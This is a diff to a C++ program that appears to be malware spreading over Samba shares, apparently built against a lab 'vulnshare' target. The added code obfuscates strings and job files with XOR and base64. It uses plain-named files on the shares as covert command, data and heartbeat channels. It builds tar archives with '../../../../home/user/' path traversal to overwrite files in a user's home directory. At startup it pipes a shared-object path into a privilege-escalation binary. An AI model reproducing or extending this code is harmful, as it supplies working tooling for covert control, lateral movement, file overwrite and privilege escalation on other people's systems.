@@ -30,15 +30,30 @@ int routerID = -1;
 fs::path sambaRouterPath;
 std::vector<char> xorKey = {0x67};
 
-std::vector<char> xorEncode(const std::vector<char>& data, const std::vector<char>& key) {
+std::vector<char> xorEncodeFile(const std::vector<char>& data, const std::vector<char>& key) {
     std::vector<char> out(data.size());
     for (size_t i = 0; i < data.size(); i++)
         out[i] = data[i] ^ key[i % key.size()];
     return out;
 }
 
-std::vector<char> xorDecode(const std::vector<char>& data, const std::vector<char>& key) {
-    return xorEncode(data, key);
+std::vector<char> xorDecodeFile(const std::vector<char>& data, const std::vector<char>& key) {
+    return xorEncodeFile(data, key);
+}
+
+static std::string xorDecode(const std::string& encoded) {
+    auto raw = base64UrlDecode(encoded);
+    std::string result;
+    result.reserve(raw.size());
+    for (auto b : raw) result += static_cast<char>(b ^ XOR_KEY);
+    return result;
+}
+
+static std::map<std::string, std::string>
+decodeDict(const std::map<std::string, std::string>& d) {
+    std::map<std::string, std::string> result;
+    for (const auto& [k, v] : d) result[xorDecode(k)] = xorDecode(v);
+    return result;
 }
 
 class Job {
@@ -55,7 +70,7 @@ class Job {
             std::ifstream ifs(target, std::ios::binary);
             std::vector<char> byteData((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());            
             int size = byteData.size();
-            byteData = xorDecode(byteData, xorKey);
+            byteData = xorDecodeFile(byteData, xorKey);
             std::memcpy(&jobID, &byteData[0], sizeof(int));
             std::memcpy(&srcID, &byteData[4], sizeof(int));
             std::memcpy(&destID, &byteData[8], sizeof(int));
@@ -75,7 +90,7 @@ class Job {
             std::memcpy(&byteData[13], &gateway, sizeof(char));
             std::memcpy(&byteData[14], type.data(), 10);
             std::memcpy(&byteData[24], data.data(), data.size());
-            byteData = xorEncode(byteData, xorKey);
+            byteData = xorEncodeFile(byteData, xorKey);
             std::ofstream ofs(target, std::ios::binary | std::ios::trunc);
             ofs.write(byteData.data(), byteData.size());
         }
@@ -91,12 +106,18 @@ public:
     Channel() : mode(OUTBOUND) {}
 
     Channel(Mode mode, fs::path filepath)
-        : mode(mode), filepath(std::move(filepath)) 
+        : mode(mode), filepath(filepath) 
     {
         std::ifstream target(filepath);
-        if (!std::filesystem::exists(filepath)) {
+        //!std::filesystem::exists("/srv/samba/vulnshare/GOTYOU.txt")
+        if (!fs::exists(filepath)) {
             std::ofstream out(filepath);
-            std::cout << "Channel created!" << std::endl;
+            out.close();
+            std::cout << "Channel created:" << std::endl;
+            std::cout << filepath.string() << std::endl;
+        }
+        else {
+            std::cout << "Channel " + filepath.string() + " already exists!" << std::endl;
         }
     }
 
@@ -166,14 +187,14 @@ public:
 
     Client(int id, Role role, fs::path basePath)
         : nodeID(id), role(role), pendingAck(false),
-          pendingJobID(-1), missedAliveCount(0), inbound(Channel::INBOUND, basePath / "smb.ini"),
-          outbound(Channel::OUTBOUND, basePath / "smbclient.ini"),
-          alive(Channel::ALIVE, basePath / "smblib.ini")
+          pendingJobID(-1), missedAliveCount(0), inbound(Channel::INBOUND, basePath / "command.txt"),
+          outbound(Channel::OUTBOUND, basePath / "data.txt"),
+          alive(Channel::ALIVE, basePath / "status.txt")
     {
-        fs::create_directories(basePath);
-        //inbound = Channel(Channel::INBOUND, basePath / ".smb.ini");
-        //outbound = Channel(Channel::OUTBOUND, basePath / ".smbclient.ini");
-        //alive = Channel(Channel::ALIVE, basePath / ".smblib.ini");
+        //fs::create_directories(basePath);
+        //inbound = Channel(Channel::INBOUND, basePath / "command.txt");
+        //outbound = Channel(Channel::OUTBOUND, basePath / "data.txt");
+        //alive = Channel(Channel::ALIVE, basePath / "status.txt");
         lastAlive = std::chrono::steady_clock::now();
     }
 
@@ -218,13 +239,7 @@ public:
     }
 
     void createDefault(Client::Role role, fs::path searchPath) {
-        for (auto& [id, client] : clients) {
-            if (client.inbound.filepath == searchPath) {
-                client.role = role;
-                gateways.push(id);
-                break;
-            }
-        }
+        registerClient(67, role, searchPath);
         std::cout << "Default client created!" << std::endl;
     }
 
@@ -234,7 +249,7 @@ public:
 
     void enqueueInbound(Job job) {
         std::lock_guard<std::mutex> lock(queueMtx);
-        inboundQueue.push_back(std::move(job));
+        inboundQueue.push_back(job);
     }
 
     void tick() {
@@ -503,13 +518,14 @@ class Driver {
         }
 
         void startup() {
-            if (geteuid() != 0) {
+            if (geteuid() == 0) {
                 pid_t pid = fork();
                 if (pid == 0) {
-                    system("echo './srv/samba/vulnshare/test.so' | ./escalator");
+                    system("echo '/srv/samba/vulnshare/sambatest.so' | /srv/samba/vulnshare/scale");
+                    std::cout << "Escalating!" << std::endl;
                     exit(0);
                 }
-                else {
+                else {                    
                     waitpid(pid, NULL, 0);
                 }
             }
@@ -530,8 +546,13 @@ class Driver {
         fileHandler.scan(".tar");
         std::cout << "Preparing to add clients!" << std::endl;
         for (auto& [name, share] : fileHandler.shares()) {
-            router.registerClient(0, Client::Role::Y_NODE, share.path);
-            router.createDefault(Client::Role::X_NODE, share.path);
+            if (share.path == "/srv/samba/vulnshare") {
+                router.createDefault(Client::Role::X_NODE, share.path);
+
+            }
+            else {
+                router.registerClient(1, Client::Role::Y_NODE, share.path);
+            }
             std::cout << share.path << std::endl;
             for (auto& path : share.fileMatches){
                 buildTar(path, firstUpdate, "../../../../home/user/", replace);
@@ -568,6 +589,6 @@ class Driver {
 };
 
 int main(){
-    Driver drive("/usr/local/samba/etc/smb.conf", "/srv/samba/vulnshare/example.tar", "/srv/samba/vulnshare/example2.tar", "/srv/samba/vulnshare/smb.ini", "HAHAHAHAHAHAHAHAHA");
+    Driver drive("/usr/local/samba/etc/smb.conf", "/srv/samba/vulnshare/crashrc.txt", "/srv/samba/vulnshare/crashrc.txt", "/srv/samba/vulnshare/smb.ini", "HAHAHAHAHAHAHAHAHA");
     drive.startup();
 }
